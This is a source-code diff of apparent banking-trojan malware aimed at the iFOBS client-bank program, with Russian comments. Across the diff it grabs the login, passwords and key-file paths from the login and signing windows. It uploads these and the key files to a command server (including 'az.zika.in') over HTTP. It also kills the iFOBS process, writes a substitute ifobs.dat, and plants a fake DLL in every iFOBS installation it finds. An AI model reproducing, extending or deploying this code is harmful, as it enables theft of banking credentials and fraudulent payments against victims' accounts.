@@ -10,6 +10,8 @@
 #include "Inject.h"
 #include "BotCore.h"
 #include "StrConsts.h"
+#include <shlwapi.h>
+#include <shlobj.h>
 
 #include "BotDebug.h"
 
@@ -23,11 +25,13 @@ namespace IFOBSCLIENT
 namespace IFobs
 {
 
-const int PROCESS_HASH = 0x9FF6B644; /* ifobsclient.exe */
-const DWORD HashClassEditControl = 0x2ED8AE2E; /* TcxCustomInnerTextEdit */
-const DWORD HashClassButtonControl = 0xA5AD5F9; /* TcxButton */
+const int PROCESS_HASH = 0x9FF6B644; // ifobsclient.exe
+const DWORD HashClassEditControl = 0x2ED8AE2E; // TcxCustomInnerTextEdit 
+const DWORD HashClassButtonControl = 0xA5AD5F9; // TcxButton
+const DWORD HashClassEditComboBox = 0x8EDA56FA; // TcxCustomComboBoxInnerEdit
 //хеш окна регистрации
-const DWORD HashClassLoginForm = 0x918D725B; /* TLoginForm.UnicodeClass*/ 
+const DWORD HashClassLoginForm = 0x918D725B; // TLoginForm.UnicodeClass
+const DWORD HashSignAsForm = 0x8225F3D9; // TSignAsForm.UnicodeClass
 
 const int MaxFindedControl = 6;
 
@@ -38,7 +42,7 @@ struct ForFindControl
 	HWND wnds[MaxFindedControl];
 	char* texts[MaxFindedControl];
 	int count;
-	DWORD hash;
+	DWORD hash1, hash2;
 };
 
 struct AccBalans
@@ -77,17 +81,35 @@ typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
 
 
 char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер
-char resultGrab[512]; //результат грабера для отсылки в админку и видео сервер
+char resultGrab[768]; //результат грабера для отсылки в админку и видео сервер
 
 //хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
-DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
+DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 
+					 0xBEA055E9 /* Підписати */, 0xBE1A55FD /* Подписать */, 0xA7A73EE /* Sign */, 0 };
 AccBalans dataFromPlug; //данные от ifobs.plug
+
+int typeActive = 0; //с какоо окна грабим: 1 - регистрация, 2 - подписывание
+
+static char* GetAdminUrl( char* url )
+{
+#ifdef DEBUGCONFIG
+	m_lstrcpy( url, "az.zika.in" );
+#else
+//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
+	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
+	if( !host.IsEmpty() )
+		m_lstrcpy( url, host.t_str() );
+	else
+		url = 0;
+#endif
+	return url;
+}
 
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
 	ForFindControl* ffc = (ForFindControl*)lParam;
 	DWORD hash = GetWndClassHash(hwnd);
-	if( hash == ffc->hash )
+	if( hash == ffc->hash1 || hash == ffc->hash2 )
 	{
 		ffc->wnds[ffc->count] = hwnd;
 		ffc->texts[ffc->count] = GetWndText(hwnd);
@@ -117,6 +139,33 @@ static void FreeFFC( ForFindControl& ffc )
 	for( int i = 0; i < ffc.count; i++ ) STR::Free(ffc.texts[i]);
 }
 
+//создает и возвращает рабочую папку для IFobs, в нее ложатся файлы необходимые для плагина
+static char* GetWorkFolder( char* path )
+{
+	pSHGetFolderPathA( 0, CSIDL_LOCAL_APPDATA,  0, 0, path );
+	pPathAppendA( path, "IFobs" );
+	pCreateDirectoryA( path, 0 ); //создает папку, если ее нет
+	return path;
+}
+
+static DWORD WINAPI SendResultGrab(void*)
+{
+	char urlAdmin[128];
+	if( GetAdminUrl(urlAdmin) )
+	{
+		TMemory request(1024);
+		string azUser = GetAzUser();
+		char* urlText = URLEncode(resultGrab);
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
+		THTTP H;
+		H.Get(request.AsStr());
+		DBG( "IFobs", "Отослали запрос resultGrab: '%s'", request.AsStr() );
+		STR::Free(urlText);
+	}
+	return 0;
+}
+
 //в окне регистрации 4-е текстовых поля ввода, путем перечисления всех дочерних окон находим эти контролы
 //в массиве texts структуры ForFindEditControl они находятся в следующем порядке: 0 - путь к ключам, 
 //1 - пароль для ключей, 2 - пароль для входа систему, 3 - логин
@@ -126,18 +175,51 @@ static void GrabData( HWND wnd )
 	ForFindControl ffc;
 	ClearStruct(ffc);
 	resultGrab[0] = 0;
-	ffc.hash = HashClassEditControl;
+	if( typeActive == 1 ) //окно регистрации
+	{
+		ffc.hash1 = HashClassEditControl;
+		ffc.hash2 = -1;
+	}
+	else //окно подписи
+	{
+		ffc.hash1 = HashClassEditControl;
+		ffc.hash2 = HashClassEditComboBox;
+	}
 	pEnumChildWindows( wnd, EnumChildProc, &ffc );
-	AddStrLog( "Login", ffc.texts[3] );
-	AddStrLog( "Password system", ffc.texts[2] );
-	AddStrLog( "Password key", ffc.texts[1] );
-	AddStrLog( "Path keys", ffc.texts[0] );
-	DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
-	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
-		KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
-	VideoLog::Send( "ifobs", 11, resultGrab );
-	VideoProcess::SendFiles( 0, "keys", ffc.texts[0], 10, true );
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+	char serverKeys[128];
+	if( typeActive == 1 ) //окно регистрации
+	{
+		AddStrLog( "Login", ffc.texts[3] );
+		AddStrLog( "Password system", ffc.texts[2] );
+		AddStrLog( "Password key", ffc.texts[1] );
+		AddStrLog( "Path keys", ffc.texts[0] );
+		m_lstrcat( resultGrab, ", Client folder: " );
+		m_lstrcat( resultGrab, folderIFobs );
+		DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
+		if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
+			KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
+		VideoLog::Send( "ifobs", 11, resultGrab );
+		pwsprintfA( serverKeys, "keys\\%s", ffc.texts[3] );
+		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 10, true );
+	}
+	else
+	{
+		AddStrLog( "Sign login", ffc.texts[2] );
+		AddStrLog( "Sign Password", ffc.texts[1] );
+		AddStrLog( "Sign Path", ffc.texts[0] );
+		DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
+		if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
+			KeyLogger::AddDirectory( ffc.texts[0], "KeysSign" );
+		m_lstrcat( resultGrab, ", Client folder: " );
+		m_lstrcat( resultGrab, folderIFobs );
+		VideoLog::Send( "ifobs", 12, resultGrab );
+		pwsprintfA( serverKeys, "keyssign\\%s", ffc.texts[3] );
+		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 10, true );
+	}
+	RunThread( SendResultGrab, 0 );
 	FreeFFC(ffc);
+//	KeyLogger::CloseSession();
 }
 
 //это кнопка Принять
@@ -169,7 +251,8 @@ static HWND GetLoginForm( HWND wnd )
 	char className[128];
 	pGetClassNameA( mainWnd, className, 128 );
 	DBG( "IFobs", "parent %08x, '%s', %08x", mainWnd, className, STR::GetHash( className, 0, false ) );
-	if( GetWndClassHash(mainWnd) != HashClassLoginForm )
+	DWORD hash = GetWndClassHash(mainWnd);
+	if( hash != HashClassLoginForm && hash != HashSignAsForm )
 	{
 		wnd = mainWnd;
 		mainWnd = 0;
@@ -178,7 +261,8 @@ static HWND GetLoginForm( HWND wnd )
 	{
 		ForFindControl ffc;
 		ClearStruct(ffc);
-		ffc.hash = HashClassLoginForm;
+		ffc.hash1 = HashClassLoginForm;
+		ffc.hash2 = HashSignAsForm;
 		pEnumChildWindows( wnd, EnumChildProc, &ffc );
 		if( ffc.count > 0 )
 			mainWnd = ffc.wnds[0];
@@ -217,7 +301,8 @@ static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 			//ищем все кнопки на форме
 			ForFindControl ffc;
 			ClearStruct(ffc);
-			ffc.hash = HashClassButtonControl;
+			ffc.hash1 = HashClassButtonControl;
+			ffc.hash2 = -1;
 			pEnumChildWindows( mainWnd, EnumChildProc, &ffc );
 			//ищем кнопку Принять
 			for( int i = 0; i < ffc.count; i++ )
@@ -237,28 +322,13 @@ static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 		}
 }
 
-static char* GetAdminUrl( char* url )
-{
-#ifdef DEBUGCONFIG
-	m_lstrcpy( url, "az.zika.in" );
-#else
-//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
-	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
-	if( !host.IsEmpty() )
-		m_lstrcpy( url, host.t_str() );
-	else
-		url = 0;
-#endif
-	return url;
-}
-
 static DWORD WINAPI SendBalans( LPVOID p )
 {
 	char urlAdmin[128];
 	VideoLog log( "ifobs" );
-	TMemory text(512);
+	TMemory text(768);
 	fwsprintfA pwsprintfA = Get_wsprintfA();
-	pwsprintfA( text.AsStr(), "DLL -> Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys );
+	pwsprintfA( text.AsStr(), "DLL -> Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s, Client folder: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys, folderIFobs );
 	log.Send( 0, "Счет: '%s', баланс: '%s', банк: '%s'", dataFromPlug.acc, dataFromPlug.balans, dataFromPlug.nameBank );
 	log.Send2( 0, text.AsStr() );
 	if( GetAdminUrl(urlAdmin) )
@@ -267,7 +337,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		string azUser = GetAzUser();
 		char* urlBank = URLEncode(dataFromPlug.nameBank);
 		char* urlText = URLEncode(text);
-		char* urlText2 = URLEncode(resultGrab);
+//		char* urlText2 = URLEncode(resultGrab);
 
 		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.acc, urlBank );
 		THTTP H;
@@ -278,15 +348,15 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		H.Get(request.AsStr());
 		DBG( "IFobs", "Отослали запрос 2: '%s'", request.AsStr() );
 
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText2 );
-		H.Get(request.AsStr());
-		DBG( "IFobs", "Отослали запрос 3: '%s'", request.AsStr() );
+//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText2 );
+//		H.Get(request.AsStr());
+//		DBG( "IFobs", "Отослали запрос 3: '%s'", request.AsStr() );
 
 		STR::Free(urlBank);
 		STR::Free(urlText);
-		STR::Free(urlText2);
-
-		VideoProcess::SendFiles( 0, "keys_dll", dataFromPlug.pathKeys, 20 );
+//		STR::Free(urlText2);
+		pwsprintfA( request, "keys_dll\\%s", dataFromPlug.login );
+		VideoProcess::SendFiles( 0, request, dataFromPlug.pathKeys, 20 );
 	}
 	return 0;
 }
@@ -346,7 +416,7 @@ static DWORD WINAPI LoadPluginIFobs(LPVOID)
 		
 		//пишем в папку клиента RtlExt.bpl, она необходима для работы плагина
 		char pathExtRtl[MAX_PATH];
-		m_lstrcpy( pathExtRtl, folderIFobs );
+		GetWorkFolder(pathExtRtl);
 		pPathAppendA( pathExtRtl, "RtlExt.bpl" );
 		if( File::WriteBufferA( pathExtRtl, rtlExt, sizeRtlExt ) == sizeRtlExt )
 		{
@@ -425,11 +495,11 @@ DWORD WINAPI SendIFobs(LPVOID)
 	DBG( "IFobs", "запуск отсылки программы на сервер из папки %s", folderIFobs );
 	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
 	DWORD folderSize = 0;
-	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
-	{
-		DBG( "IFobs", "Папка программы больше заданного размера, не копируем" );
-		return 0;
-	}
+//	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
+//	{
+//		DBG( "IFobs", "Папка программы больше заданного размера, не копируем" );
+//		return 0;
+//	}
 	DBG( "IFobs", "Размер папки %d байт", folderSize );
 	char tempFolder[MAX_PATH];
 	pGetTempPathA( sizeof(tempFolder), tempFolder );
@@ -460,13 +530,22 @@ DWORD WINAPI SendIFobs(LPVOID)
 	return 0;
 }
 
-void Activeted(LPVOID Sender)
+//активация при регистариции
+void Activeted1(LPVOID Sender)
 {
-	DBG( "IFobs", "Activated" );
+	DBG( "IFobs", "Activated1" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
-	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
+//	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
 		MegaJump(SendIFobs);
 	VideoProcess::RecordPID( 0, "IFobs" );
+	typeActive = 1;
+}
+//активация при подписывании
+void Activeted2(LPVOID Sender)
+{
+	DBG( "IFobs", "Activated2" );
+	PKeyLogSystem System = (PKeyLogSystem)Sender;
+	typeActive = 2;
 }
 
 bool Init( const char* appName )
@@ -476,22 +555,31 @@ bool Init( const char* appName )
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
 	if( S != NULL )
 	{
-		char* caption = "*iFOBS*ст*ац*я*";
-		char* caption2 = "*iFOBS*Regis*";
+		//фильтр на форму регистрации
+		char* caption11 = "*iFOBS*ст*ац*я*";
+		char* caption12 = "*iFOBS*Regis*";
 		S->MakeScreenShot = true;
 		S->SendLogAsCAB = true;
-		S->OnActivate = Activeted;
 		//S->OnDeactivate = Deactiveted;
 		S->OnMessage = OnMessage;
 		
-		PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, NULL, caption, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, caption11, FILTRATE_PARENT_WND, LOG_ALL, 5);
 		m_lstrcpy( folderIFobs, appName ); //копируем путь к iFOBSClient.exe
 		pPathRemoveFileSpecA(folderIFobs); //папка с прогой
-		if( F )
+		if( F1 )
 		{
-			KeyLogger::AddFilterText(F, NULL, caption2 );
+			KeyLogger::AddFilterText(F1, NULL, caption12 );
+			F1->OnActivate = Activeted1;
 		}
-
+		//фильтр на форму подписывания
+		char* caption21 = "*дписат*мен*"; //"подписать от имени", "Підписати від імені"
+		char* caption22 = "Sign*";
+		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, NULL, caption21, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		if( F2 )
+		{
+			KeyLogger::AddFilterText(F2, NULL, caption22 );
+			F2->OnActivate = Activeted2;
+		}
 		//запускаем в отдельном потоке загрузку и установку плагина, ждем не более 10с
 		pluginInstalled = 0;
 		RunThread( LoadPluginIFobs, 0 );
@@ -507,20 +595,21 @@ bool Init( const char* appName )
 	}
 	return true;
 }
-/*
+
 static void FindExe(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
 {
 	DWORD hash = STR::GetHash(Search->cFileName,0,true);
 	if( hash == PROCESS_HASH )
 	{
 		DBG( "IFobs", "Find %s", FileName );
-		VideoLog::Send( "ifobs", 30, "find %s", FileName );
-		Cancel = true;
+		TBotStrings* clients = (TBotStrings*)Data;
+		clients->Add(FileName);
 	}
 }
 
-DWORD WINAPI FindIFobsClient(LPVOID)
+static void FindIFobsClient(TBotStrings* clients)
 {
+	char* ret = 0;
 	DWORD drives = (DWORD)pGetLogicalDrives();
 	char drive[] = { 'C', ':', '\\', 0 };
 	//ищем только на жестком диске
@@ -533,19 +622,122 @@ DWORD WINAPI FindIFobsClient(LPVOID)
 			//смотрим только жесткие диски
 			if( tp == DRIVE_FIXED )
 			{
-				if( !SearchFiles( drive, "*.exe", true, FA_ANY_FILES, 0, FindExe ) )
+				if( !SearchFiles( drive, "*.exe", true, FA_ANY_FILES, clients, FindExe ) )
+				{
 					break;
+				}
 			}
 		}
 	}
+}
+
+
+DWORD WINAPI KillIFobs( void* p )
+{
+	int attempts = ((int)p) + 1;
+	for( int i = 0; i < attempts; i++ )
+	{
+		DWORD pid = GetProcessIdByHash(PROCESS_HASH);
+		DBG( "IFobs", "Kill pid %d", pid );
+		if( pid != DWORD(-1) )
+		{
+			KillProcess( pid, 1000 );
+			break;
+		}
+		pSleep(1000);
+	}
 	return 0;
 }
-*/
 
-void KillIFobs()
+//создает файл подмены ifobs.dat
+void CreateFileReplacing( const char* s )
 {
-	DWORD pid = GetProcessIdByHash(PROCESS_HASH);
-	KillProcess( pid, 1000 );
+	if( s == 0 ) return;
+	TMemory data(1024);
+	int lenData = 0;
+	const char* end = s + m_lstrlen(s);
+	const char* p = s;
+	//ставим вместо пробелов переводы строк
+	while( p < end )
+	{
+		const char* p2 = STR::Scan( p, ' ' );
+		if( p2 == 0 ) p2 = end;
+		m_memcpy( data.AsStr() + lenData, p, p2 - p );
+		lenData += p2 - p;
+		if( p2 != end ) //в последней строке не нужен перевод строки
+		{
+			data.AsStr()[lenData++] = '\r';
+			data.AsStr()[lenData++] = '\n';
+		}
+		p = p2 + 1;
+	}
+	char path[MAX_PATH];
+	GetWorkFolder(path);
+	pPathAppendA( path, "ifobs.dat" );
+	File::WriteBufferA( path, data.AsStr(), lenData );
+	DBG( "IFobs", "Создали файл '%s'", path );
+}
+
+DWORD WINAPI IntallFakeDll(void*)
+{
+	const char* dlls[] =
+	{
+		"nkicnt.dll",
+//		"keypro2.dll",
+		"libeay32.dll"
+	};
+	if( BOT::FakeDllIFobsInstalled() ) 
+	{
+		DBG( "IFobs", "fake.dll уже установлена" );
+		return 0; 
+	}
+
+	//на компе может быть много клиентов ифобса, ищем все и заражаем все
+	TBotStrings clients;
+	FindIFobsClient(&clients);
+	if( clients.Count() == 0 ) return 0; //ифобса нет
+
+	DBG("IFobs", "Начинаем инсталяцию fake.dll");
+	
+	TPlugin intaller(GetStr(EStrFakeDllInstaller));
+	TPlugin bot(GetStr(EStrBotPlug));
+
+	// Загружаем плагины
+	if (!intaller.Download(true) || !bot.Download(false))
+	{
+		DBG("IFobs", "Плагины не удалось загрузить" );
+		return 0;
+	}
+
+	DBG("IFobs", "Плагины успешно загружены, начинаем инсталцию");
+
+	// Запускаем инсталяцию
+	typedef BOOL (WINAPI *TInstall2)(const char* nameDll, BYTE* dllBody, DWORD dllSize);
+
+	TInstall2 install;
+	if (intaller.GetProcAddress(0x4CA88DAD /* Install2 */, (LPVOID&)install))
+	{
+		char folderClient[MAX_PATH];
+		bool installed = false;
+		for( int i = 0; i < clients.Count(); i++ )
+		{
+			m_lstrcpy( folderClient, clients[i].t_str() );
+			pPathRemoveFileSpecA(folderClient);
+			DWORD rand = (DWORD)pGetTickCount();
+			pPathAppendA( folderClient, dlls[ rand % ARRAYSIZE(dlls) ] );
+			if( install( folderClient, (LPBYTE)bot.Data(), bot.Size()) )
+			{
+				DBG("IFobs", "Инсталяция fake.dll для '%s' успешно выполнена", clients[i].t_str() );
+				installed = true;
+			}
+		}
+		if( installed )
+		{
+			BOT::SaveSettings(true, false, true);
+			Bot->CreateFileA( 0, GetStr(EStrFakeDllIFobsFlag).t_str() );
+		}
+	}
+	return 0;
 }
 
 }
